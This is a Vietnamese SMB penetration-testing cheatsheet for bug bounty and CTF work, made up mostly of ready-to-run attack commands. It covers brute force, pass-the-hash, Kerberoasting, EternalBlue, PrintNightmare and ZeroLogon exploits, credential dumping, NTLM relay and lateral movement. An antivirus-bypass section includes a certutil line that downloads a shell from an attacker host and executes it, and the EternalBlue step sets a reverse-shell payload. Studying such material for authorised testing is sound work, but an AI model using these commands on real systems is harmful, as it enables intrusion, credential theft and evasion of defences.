# 🛡️ SMB Pentest Cheatsheet — Bug Bounty & CTF

> **Mục đích:** Tài liệu tham khảo nhanh cho pentester khi kiểm tra giao thức SMB (Server Message Block).  
> **Phiên bản:** SMBv1 / SMBv2 / SMBv3  
> **Cảnh báo:** Chỉ sử dụng trên hệ thống bạn được phép kiểm tra.

---

## 📌 Mục Lục

1. [[#Thông tin cơ bản]]
2. [[#Enumeration]]
3. [[#Null Session & Anonymous Access]]
4. [[#Authentication Attacks]]
5. [[#Exploit nổi tiếng]]
6. [[#Post-Exploitation]]
7. [[#Lateral Movement qua SMB]]
8. [[#Relay Attacks]]
9. [[#Kiểm tra cấu hình sai]]
10. [[#Tools tổng hợp]]
11. [[#Tips CTF]]
12. [[#Phòng thủ & bypass]]

---

## Thông tin cơ bản

|Thông số|Chi tiết|
|---|---|
|Port mặc định|TCP 445 (SMB trực tiếp), TCP 139 (SMB qua NetBIOS)|
|UDP|137, 138 (NetBIOS Name Service)|
|Phiên bản|SMBv1 (không an toàn), SMBv2, SMBv3 (hỗ trợ mã hóa)|
|Auth|NTLM, Kerberos, NTLMv2|
|OS phổ biến|Windows, Samba (Linux/Mac)|

```
# Kiểm tra port SMB
nmap -p 139,445 <target>
nmap -p 445 --open -sV <subnet>/24
```

---

## Enumeration

### Nmap Scripts

```bash
# Quét toàn diện SMB
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery \
     -p 445 <target>

# Kiểm tra SMBv1 (nguy hiểm - EternalBlue)
nmap --script smb-security-mode -p 445 <target>

# Kiểm tra vuln tự động
nmap --script smb-vuln* -p 445 <target>

# Brute force users
nmap --script smb-brute -p 445 <target>

# Lấy thông tin OS
nmap --script smb-os-discovery -p 445 <target>
```

### enum4linux / enum4linux-ng

```bash
# Enum tất cả
enum4linux -a 10.48.148.130

# Từng phần
enum4linux -U 10.48.148.130    # Users
enum4linux -S 10.48.148.130    # Shares
enum4linux -G 10.48.148.130    # Groups
enum4linux -o 10.48.148.130    # OS info

# enum4linux-ng (phiên bản mới, mạnh hơn)
enum4linux-ng -A <target>
enum4linux-ng -A -u '' -p '' <target>          # null session
enum4linux-ng -A -u 'guest' -p '' <target>     # guest
enum4linux-ng -A -u 'user' -p 'pass' <target>  # có credentials
```

### CrackMapExec (CME / NetExec)

```bash
# Ping sweep SMB
crackmapexec smb <subnet>/24

# Lấy thông tin host
crackmapexec smb <target>

# Enum shares
crackmapexec smb <target> -u '' -p '' --shares
crackmapexec smb <target> -u 'guest' -p '' --shares

# Enum users
crackmapexec smb <target> -u '' -p '' --users
crackmapexec smb <target> -u 'user' -p 'pass' --users

# Enum groups
crackmapexec smb <target> -u 'user' -p 'pass' --groups

# Enum password policy
crackmapexec smb <target> -u '' -p '' --pass-pol
```

### smbclient

```bash
# Liệt kê shares (anonymous)
smbclient -L //<target> -N
smbclient -L //<target> -U ''

# Kết nối vào share
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U 'user%password'

# Kết nối với hash (Pass-the-Hash)
smbclient //<target>/<share> -U 'user' --pw-nt-hash <NThash>
```

### rpcclient

```bash
# Kết nối null session
rpcclient -U '' -N <target>

# Các lệnh hữu ích trong rpcclient
rpcclient> enumdomusers       # liệt kê users
rpcclient> enumdomgroups      # liệt kê groups
rpcclient> querydominfo       # thông tin domain
rpcclient> getdompwinfo       # password policy
rpcclient> netshareenum       # liệt kê shares
rpcclient> lsaenumsid         # liệt kê SIDs
rpcclient> lookupnames <user> # tìm SID của user

# RID cycling - tìm users theo RID
for i in $(seq 500 1100); do
  rpcclient -U '' -N <target> -c "queryuser $i" 2>/dev/null | grep "User Name"
done
```

### ldapsearch (nếu domain controller)

```bash
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"
```

---

## Null Session & Anonymous Access

```bash
# Test null session
smbclient -L //<target> -N
rpcclient -U "" -N <target> -c "enumdomusers"

# Mount share ẩn danh
mount -t cifs //<target>/share /mnt/smb -o guest,vers=2.0

# smbmap - kiểm tra quyền
smbmap -H <target>                    # anonymous
smbmap -H <target> -u '' -p ''       # null
smbmap -H <target> -u 'user' -p 'pass'

# Đọc file trong share
smbmap -H <target> -u 'guest' -p '' -r 'ShareName'
smbmap -H <target> -u 'user' -p 'pass' --download 'Share/path/file.txt'
```

---

## Authentication Attacks

### Brute Force

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target> -t 4

# CrackMapExec
crackmapexec smb <target> -u users.txt -p passwords.txt
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb <target> -u 'admin' -p passwords.txt

# Medusa
medusa -h <target> -u admin -P rockyou.txt -M smbnt
```

### Pass-the-Hash (PTH)

```bash
# CrackMapExec PTH
crackmapexec smb <target> -u 'Administrator' -H 'LMHASH:NTHASH'
crackmapexec smb <target> -u 'Administrator' -H 'NTHASH'

# smbclient PTH
smbclient //<target>/C$ -U 'Administrator' --pw-nt-hash <NTHASH>

# Impacket PTH
impacket-psexec Administrator@<target> -hashes ':NTHASH'
impacket-wmiexec Administrator@<target> -hashes ':NTHASH'
impacket-smbexec Administrator@<target> -hashes ':NTHASH'
```

### Kerberoasting & ASREPRoasting

```bash
# Kerberoasting
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request

# ASREPRoasting (user không cần pre-auth)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
impacket-GetNPUsers domain.local/user:pass -dc-ip <DC_IP> -request

# Crack hash với hashcat
hashcat -m 18200 hash.txt rockyou.txt   # ASREPRoast
hashcat -m 13100 hash.txt rockyou.txt   # Kerberoast
```

---

## Exploit nổi tiếng

### EternalBlue — MS17-010 (SMBv1)

```bash
# Kiểm tra vulnerability
nmap --script smb-vuln-ms17-010 -p 445 <target>
msf> use auxiliary/scanner/smb/smb_ms17_010

# Exploit với Metasploit
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS <target>
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST <attacker_ip>
msf> run

# Exploit không cần Metasploit (Python)
git clone https://github.com/worawit/MS17-010
python checker.py <target>
python eternalblue_exploit7.py <target> shellcode/sc_x64.bin
```

### EternalRomance — MS17-010 (SMBv1, Windows 2003-2008)

```bash
msf> use exploit/windows/smb/ms17_010_psexec
msf> set RHOSTS <target>
msf> run
```

### PrintNightmare — CVE-2021-1675 / CVE-2021-34527

```bash
# Kiểm tra
crackmapexec smb <target> -u 'user' -p 'pass' -M printnightmare

# Exploit
python3 CVE-2021-1675.py domain/user:pass@<target> '\\<attacker>\share\evil.dll'
```

### SambaCry — CVE-2017-7494 (Linux Samba)

```bash
msf> use exploit/linux/samba/is_known_pipename
msf> set RHOSTS <target>
msf> run
```

### SMBGhost — CVE-2020-0796 (SMBv3.1.1)

```bash
# Kiểm tra
nmap --script smb-vuln-CVE-2020-0796 -p 445 <target>

# PoC (DoS / RCE)
python3 CVE-2020-0796.py <target>
```

### ZeroLogon — CVE-2020-1472 (Netlogon)

```bash
python3 zerologon_tester.py <DC_NAME> <DC_IP>

# Exploit
python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP>
impacket-secretsdump -no-pass -just-dc <DOMAIN>/<DC_NAME>\$@<DC_IP>
```

---

## Post-Exploitation

### Dump credentials

```bash
# Dump SAM / LSA qua CrackMapExec
crackmapexec smb <target> -u 'admin' -p 'pass' --sam
crackmapexec smb <target> -u 'admin' -p 'pass' --lsa
crackmapexec smb <target> -u 'admin' -p 'pass' --ntds   # Domain Controller

# Impacket secretsdump
impacket-secretsdump admin:pass@<target>
impacket-secretsdump -hashes ':NTHASH' admin@<target>
impacket-secretsdump domain/admin:pass@<DC_IP> -just-dc-ntlm

# Dump với NTDS.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Thực thi lệnh từ xa

```bash
# PSExec
impacket-psexec admin:pass@<target>
impacket-psexec -hashes ':NTHASH' admin@<target>

# WMIExec (ít tạo file hơn)
impacket-wmiexec admin:pass@<target>

# SMBExec
impacket-smbexec admin:pass@<target>

# CrackMapExec exec
crackmapexec smb <target> -u 'admin' -p 'pass' -x 'whoami'
crackmapexec smb <target> -u 'admin' -p 'pass' -X 'Get-Process'  # PowerShell

# Evil-WinRM (port 5985)
evil-winrm -i <target> -u admin -p pass
evil-winrm -i <target> -u admin -H NTHASH
```

### Upload/Download file

```bash
# smbclient
smbclient //<target>/C$ -U 'admin%pass'
smb: \> get secret.txt
smb: \> put payload.exe

# CrackMapExec
crackmapexec smb <target> -u 'admin' -p 'pass' --get-file C:\flag.txt flag.txt
crackmapexec smb <target> -u 'admin' -p 'pass' --put-file shell.exe C:\Windows\Temp\shell.exe

# Impacket
impacket-smbclient admin:pass@<target>
```

---

## Lateral Movement qua SMB

```bash
# Pass-the-Hash để di chuyển ngang
crackmapexec smb <subnet>/24 -u 'Administrator' -H 'NTHASH' --local-auth

# Tìm local admin trên nhiều máy
crackmapexec smb <subnet>/24 -u 'admin' -p 'pass' --local-auth

# Spray password 1 lần (tránh lockout)
crackmapexec smb <subnet>/24 -u users.txt -p 'Password123' --continue-on-success

# Dump credentials trên nhiều máy
crackmapexec smb <subnet>/24 -u 'admin' -H 'NTHASH' --local-auth --sam
```

---

## Relay Attacks

### NTLM Relay (Responder + ntlmrelayx)

```bash
# Bước 1: Tắt SMB và HTTP trong Responder
# Sửa /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Bước 2: Chạy Responder
responder -I eth0 -rdw

# Bước 3: Relay attack
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i   # interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami > C:\out.txt'  # execute command
impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server -socks   # SOCKS

# Điều kiện: SMB signing phải tắt
crackmapexec smb <subnet>/24 --gen-relay-list targets.txt
nmap --script smb-security-mode -p 445 <subnet>/24 | grep "message_signing: disabled"
```

### IPv6 + NTLM Relay (mitm6)

```bash
# Bước 1: mitm6
mitm6 -d domain.local

# Bước 2: ntlmrelayx
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.domain.local -l loot
```

### PetitPotam + NTLM Relay

```bash
# Trigger xác thực từ DC
python3 PetitPotam.py -u '' -p '' <attacker_ip> <DC_IP>

# Relay tới ADCS
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Kiểm tra cấu hình sai

```bash
# SMB Signing bị tắt (nguy cơ relay)
nmap --script smb-security-mode -p 445 <target>
crackmapexec smb <target> --gen-relay-list relay.txt

# SMBv1 đang bật (nguy cơ EternalBlue)
nmap --script smb2-security-mode -p 445 <target>
crackmapexec smb <target> -M smb1

# Guest access bật
smbclient -L //<target> -N
crackmapexec smb <target> -u 'guest' -p ''

# Shares có quyền ghi (writable)
smbmap -H <target> -u 'user' -p 'pass' | grep -i WRITE

# Shares nhạy cảm không cần auth
crackmapexec smb <target> -u '' -p '' --shares
# Chú ý: ADMIN$, C$, IPC$, SYSVOL, NETLOGON

# Kiểm tra SYSVOL/NETLOGON GPP passwords
crackmapexec smb <DC_IP> -u 'user' -p 'pass' -M gpp_password
crackmapexec smb <DC_IP> -u 'user' -p 'pass' -M gpp_autologin
```

---

## Tools tổng hợp

|Tool|Mục đích|Lệnh cài|
|---|---|---|
|`nmap`|Port scan, vuln check|`apt install nmap`|
|`enum4linux-ng`|Enumeration toàn diện|`pip3 install enum4linux-ng`|
|`smbclient`|Kết nối share|`apt install smbclient`|
|`smbmap`|Map quyền trên shares|`pip3 install smbmap`|
|`rpcclient`|RPC enumeration|`apt install samba-common-bin`|
|`crackmapexec` / `netexec`|Swiss army knife|`pip3 install crackmapexec`|
|`impacket`|Exploit & post-exploit|`pip3 install impacket`|
|`responder`|Poisoning + capture hash|`apt install responder`|
|`evil-winrm`|WinRM shell|`gem install evil-winrm`|
|`bloodhound`|AD path analysis|`apt install bloodhound`|
|`mitm6`|IPv6 MITM|`pip3 install mitm6`|
|`hashcat`|Crack hash|`apt install hashcat`|

---

## Tips CTF

### Checklist SMB trong CTF

```bash
# 1. Scan port
nmap -sC -sV -p 139,445 <target>

# 2. Thử anonymous/null session
smbclient -L //<target> -N
smbmap -H <target>

# 3. Thử guest
smbclient -L //<target> -U 'guest%'
crackmapexec smb <target> -u 'guest' -p ''

# 4. Tìm file ẩn
smbclient //<target>/sharename -N
smb: \> ls
smb: \> recurse ON
smb: \> ls
smb: \> mget *

# 5. Kiểm tra vuln
nmap --script smb-vuln* -p 445 <target>
```

### Lấy tất cả file trong share

```bash
# smbget - download toàn bộ
smbget -R smb://<target>/share -U 'user%pass'
smbget -R smb://<target>/share --no-pass

# mount và copy
mkdir /mnt/smb
mount -t cifs //<target>/share /mnt/smb -o username=user,password=pass
cp -r /mnt/smb /tmp/loot/

# CrackMapExec spider
crackmapexec smb <target> -u 'user' -p 'pass' -M spider_plus
crackmapexec smb <target> -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
```

### Tìm password trong file

```bash
# Sau khi lấy file về
grep -ri "password" /tmp/loot/
grep -ri "pass" /tmp/loot/ --include="*.txt"
grep -ri "secret" /tmp/loot/
find /tmp/loot -name "*.xml" | xargs grep -l "password"
find /tmp/loot -name "*.config" | xargs grep -l "pass"
```

### Khi có credentials thì làm gì

```bash
# Test trên nhiều services
crackmapexec smb <target> -u 'user' -p 'pass'    # ✅ pwned = local admin
crackmapexec winrm <target> -u 'user' -p 'pass'  # WinRM
crackmapexec rdp <target> -u 'user' -p 'pass'    # RDP
crackmapexec mssql <target> -u 'user' -p 'pass'  # MSSQL

# Lấy shell nếu admin
impacket-psexec user:pass@<target>
evil-winrm -i <target> -u user -p pass
```

---

## Phòng thủ & bypass

### Các biện pháp phòng thủ thường gặp

|Biện pháp|Bypass|
|---|---|
|SMB Signing bắt buộc|Không relay được, cần exploit khác|
|Account lockout|Spray chậm, 1 pass/30 phút|
|Disable SMBv1|Dùng các CVE mới hơn (SMBGhost, etc.)|
|Firewall block 445|Thử qua 139, VPN nội bộ|
|Defender/AV|Obfuscate payload, dùng living-off-the-land|
|Disable anonymous|Cần credentials trước|

### Kỹ thuật bypass AV khi exec qua SMB

```bash
# Dùng built-in Windows tools (LOLBAS)
crackmapexec smb <target> -u admin -p pass -x 'certutil.exe -urlcache -f http://<attacker>/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe'

# PowerShell encoded
crackmapexec smb <target> -u admin -p pass -X '$c=[System.Convert]::FromBase64String("BASE64_PAYLOAD");...'

# WMIExec (ít bị detect hơn PSExec)
impacket-wmiexec -nooutput admin:pass@<target> 'cmd /c whoami > C:\output.txt'
```

---

## Quick Reference — Workflow

```
[RECON]
  └─ nmap -p 445 → enum4linux-ng → smbmap → rpcclient

[ANONYMOUS ACCESS?]
  ├── YES → smbclient → tìm files → leo thang
  └── NO  → brute force / spray

[CÓ CREDENTIALS]
  ├── Check admin? → crackmapexec smb (Pwn3d!)
  ├── Exec cmd   → psexec / wmiexec / evil-winrm
  └── Dump creds → secretsdump → PTH laterally

[VULN CHECK]
  ├── SMBv1 → MS17-010 (EternalBlue)
  ├── SMBv3 → CVE-2020-0796 (SMBGhost)
  ├── No Signing → NTLM Relay (Responder + ntlmrelayx)
  └── Samba Linux → CVE-2017-7494 (SambaCry)
```

---

_Tài liệu này được tạo cho mục đích học tập và kiểm tra bảo mật hợp pháp._  
_Tham khảo thêm: [HackTricks SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)_